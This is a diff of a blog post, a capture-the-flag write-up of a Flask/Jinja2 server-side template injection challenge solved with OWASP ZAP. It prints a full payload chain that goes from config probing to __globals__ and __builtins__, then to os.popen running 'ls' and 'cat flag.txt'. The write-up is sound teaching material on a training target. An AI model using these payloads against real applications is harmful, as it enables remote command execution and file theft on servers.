@@ -52,13 +52,13 @@ Posted on Oct 4, 2022
 <p>You can install ZAP from <a href=https://www.zaproxy.org/download/>here</a>. Or you can also install a &ldquo;dev&rdquo; build by following the instrcutions <a href=https://www.zaproxy.org/docs/developer/quick-start-build/>here</a>. I would recommend you to install the &ldquo;dev&rdquo; build as it has the latest unreleased features :P.</p>
 <h1 id=recon-process>Recon process</h1>
 <p>After installaing ZAP, head to the manual explore option in the quick start panel in ZAP&rsquo;s workspace window (More about ZAP&rsquo;s GUI <a href=https://www.zaproxy.org/getting-started/#zap-desktop-ui>here</a>). I&rsquo;m enabling HUD, but you can skip that option if you want to. Copy the docker instance&rsquo;s socket address and paste it in the &ldquo;URL to explore&rdquo; field. Then click on &ldquo;Launch browser&rdquo; button. This will open up a new tab in your browser. You can use this tab to explore the target. I&rsquo;m using Firefox for this walkthrough.</p>
-<p><img src alt="ZAP' GUI image"></p>
-<p>After launching the browser we get th follwoing screen:</p>
-<p><img src alt="Templated Web Challenge Initial Screen"></p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/manual%20explore.png?raw=true" alt="ZAP GUI image"></p>
+<p>After launching the browser we get th following screen:</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/starting%20page.png?raw=true" alt="Templated Web Challenge Initial Screen"></p>
 <p>&ldquo;Powered by Flask/Jinja2&rdquo;&mldr; Huh!&mldr; So, initially, the site has nothing much to show apart from this &ldquo;statement&rdquo;. Since the challenge name is &ldquo;Templated&rdquo; and it&rsquo;s an EASY challenge, it&rsquo;s template injection for sure :P. Let&rsquo;s discover more about the site.</p>
 <p>In the response I find this <code>Server: Werkzeug/1.0.1 Python/3.9.0</code>. Flask is a python web framework and Werkzueg (I have no idea how to pronounce this) is a Web Server Gateway Interface (WSGI) library. WSGI is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request (More about WSGI <a href=https://wsgi.readthedocs.io/en/latest/index.html>here</a>). Now Werkzeug has a debug console, which can be accessed at <code>/console</code>. However this has a <a href=https://werkzeug.palletsprojects.com/en/2.2.x/debug/#debugger-pin>debugger pin</a> by default.</p>
 <p>On visiting https:///console I find this:
-<img src alt="Error 404 Image">
+<img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/error%20page.png?raw=true" alt="Error 404 Image">
 So there is no debug console, ie, debugger is not enabled, but, the &lsquo;console&rsquo; was reflected. Just to be sure that it&rsquo;s templated, I tried a new random endpoint <code>/test</code> and it was reflected too. So, it&rsquo;s templated for sure :P.</p>
 <h1 id=a-short-background-on-ssti>A short background on SSTI</h1>
 <p>SSTI or Server Side Template Injection is a technique in which attacker injects malicious code into a server using the native template syntax. Read more:</p>
@@ -70,30 +70,44 @@ So there is no debug console, ie, debugger is not enabled, but, the &lsquo;conso
 </ul>
 <h1 id=ssti-with-jinja2>SSTI with Jinja2</h1>
 <p>Werkzeug uses jinja2 templates and flask uses werkzeug. So I did what everyone does, I googled for &ldquo;flask jinja2 ssti&rdquo;. Found this wonderful <a href=https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/>blog</a> from <a href=https://www.linkedin.com/in/lanmaster53/>Timothy Tomes</a>.</p>
-<p>So I tried the following the browser address bar <code>https://&lt;socket_addr>/console{{7*7}}</code> and returned console49 could not be found. Great!</p>
+<p>So I tried the following the browser address bar <code>https://&lt;socket_addr>/console{{7*7}}</code> and returned <code>console49</code> could not be found. Great!</p>
 <p>Time to sniff out secrets and possibly find out the flag. Tried <code>https://&lt;socket_addr>/console{{config}}</code> and got this:
-<img src alt="Config Image">
-Whelp &mldr; found everything other than the flag.</p>
-<p>Let&rsquo;s try out something more with the config object using ZAP&rsquo;s Request Editor. This can be done easily by right clicking on the request in ZAP&rsquo;s workspace and selecting &ldquo;Open/Resend with Request Editor&rdquo;. I tried injecting <code>config.from_object("os")</code> but returned it None.</p>
-<p>We can get to the <em>os</em> library using something/concept called <em>Method Resolution Order (MRO)</em>. (More about MRO <a href=https://levelup.gitconnected.com/method-resolution-order-in-python-5afbaecc25e0>here</a>).</p>
-<p>Now let&rsquo;s discover the MRO of the config object. I tried <code>{{config.__class__.mro()}}</code>, hit send and got this:
-<img src alt="URL encoded config image">
-The encoded output can be a pain in the eyes so you can select the response body, right click in the reposne body and click on the &ldquo;Encode/Decode/Hash&rdquo; option. In Decode panel under &ldquo;HTML Decode&rdquo; you can see the famailar python3 output.
-<img src alt="URL Decoded image"></p>
-<p>From this we can see conclude that we cannot access the os module from here as there is no reference to <em><strong>globals</strong></em> :) . Without the <em><strong>globals</strong></em> refernce we cannot access <em><strong>builtins</strong></em> and without <em><strong>builtins</strong></em> we cannot access the os module. :)</p>
+<img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/config%20reflection.png?raw=true" alt="Config Image">
+Welp!! &mldr; found everything other than the flag.</p>
+<p>Let&rsquo;s try out something more with the config object using ZAP&rsquo;s Request Editor. This can be done easily by right clicking on the request in ZAP&rsquo;s workspace and selecting &ldquo;Open/Resend with Request Editor&rdquo;. I tried modifying the URL in request header, appending the following template to try and get an injection:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{config<span style=color:#f92672>.</span>from_object(<span style=color:#e6db74>&#34;os&#34;</span>)}}
+</code></pre></div><p>but returned it <code>None</code> :). SWEET! :)</p>
+<p>We can get to the <em>os</em> library using something/concept called <em>Method Resolution Order (MRO)</em>. (More about MRO <a href=https://levelup.gitconnected.com/method-resolution-order-in-python-5afbaecc25e0>here</a>).
+Now let&rsquo;s discover the MRO of the config object. I tried:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{config<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>mro()}}
+</code></pre></div><p>hit send and got this:</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/config%20mro.png?raw=true" alt="URL encoded config image"></p>
+<p>The encoded output can be a pain in the eyes so you can select the response body, right click in the reposne body and click on the &ldquo;Encode/Decode/Hash&rdquo; option. In Decode panel under &ldquo;HTML Decode&rdquo; you can see the famailar python3 output.</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/decode.png?raw=true" alt="URL Decoded image"></p>
+<p>From this we can see conclude that we cannot access the os module from here as there is no reference to <em>__globals__</em> :) . Without the <em>__globals__</em> reference we cannot access <em>__builtins__</em> and without <em>__builtins__</em> we cannot access the os module. :)</p>
 <p>So time to try something else. Let&rsquo;s try and see if the site has been configured/ written like the flask bolier plates using an <em>app</em> object. I tried <code>{{app.__class__.mro()}}</code> and got a 500 error. :/</p>
-<p>Let&rsquo;s try this now <code>{{app.__class__.__init__.__globals__}}</code>. It works! We are in business!! :D
-<img src alt="App globals image">
-We can now use <em><strong>builtins</strong></em> to access the os module. Let&rsquo;s try <code>{{app.__class__.__init__.__globals__.__builtins__}}</code> and gotcha:
-<img src alt="App builtins image">
-Now let&rsquo;s import the os module and get the user ids. I tried <code>{{app.__class__.__init__.__globals__.__builtins__.__import__("os").getuid()}}</code> and :)
-<img src alt="UserId image"></p>
+<p>Let&rsquo;s try this now</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{app<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__}}
+</code></pre></div><p>It works! We are in business!! :D</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/global.png?raw=true" alt="App globals image">
+We can now use <em>__builtins__</em> to access the os module. Let&rsquo;s try</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{app<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>__builtins__}}
+</code></pre></div><p>and gotcha:</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/builtins.png?raw=true" alt="App builtins image"></p>
+<p>Now let&rsquo;s import the os module and get the user ids. I tried</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{app<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>__builtins__<span style=color:#f92672>.</span>__import__(<span style=color:#e6db74>&#34;os&#34;</span>)<span style=color:#f92672>.</span>getuid()}}
+</code></pre></div><p>and :)</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/userid.png?raw=true" alt="UserId image"></p>
 <h1 id=time-to-get-the-flag>Time to get the flag</h1>
-<p>Well we are &ldquo;in&rdquo;. So now time to discover the server. I tried <code>{{app.__class__.__init__.__globals__.__builtins__.__import__("os").popen("ls").read()}}</code> and got this:
-<img src alt="ls image">
-So we have a <em>flag.txt</em> file. Let&rsquo;s try to read it. I tried <code>{{app.__class__.__init__.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read()}}</code> and got this:
-<img src alt="Flag image">
-There is our 31337 string. :)</p>
+<p>Well we are &ldquo;in&rdquo;. So now time to discover the server. I tried</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{app<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>__builtins__<span style=color:#f92672>.</span>__import__(<span style=color:#e6db74>&#34;os&#34;</span>)<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#34;ls&#34;</span>)<span style=color:#f92672>.</span>read()}}
+</code></pre></div><p>and got this:</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/ls%20result.png?raw=true" alt="ls image"></p>
+<p>So we have a <em>flag.txt</em> file. Let&rsquo;s try to read it. I tried</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>{{app<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>__builtins__<span style=color:#f92672>.</span>__import__(<span style=color:#e6db74>&#34;os&#34;</span>)<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#34;cat flag.txt&#34;</span>)<span style=color:#f92672>.</span>read()}}
+</code></pre></div><p>and got this:</p>
+<p><img src="https://github.com/ArkaprabhaChakraborty/ArkaprabhaChakraborty.github.io/blob/main/data/images/templated%20flag.png?raw=true" alt="Flag image"></p>
+<p>There is our 31337 string. :)</p>
 <h1 id=conclusion>Conclusion</h1>
 <p>This was a fun challenge. SSTI&rsquo;s like these can be stopped if the input is sanitized and validated properly. That being said it was a very beginner friendly challenge. I hope you enjoyed reading this writeup/blog. :)</p>
 </section>
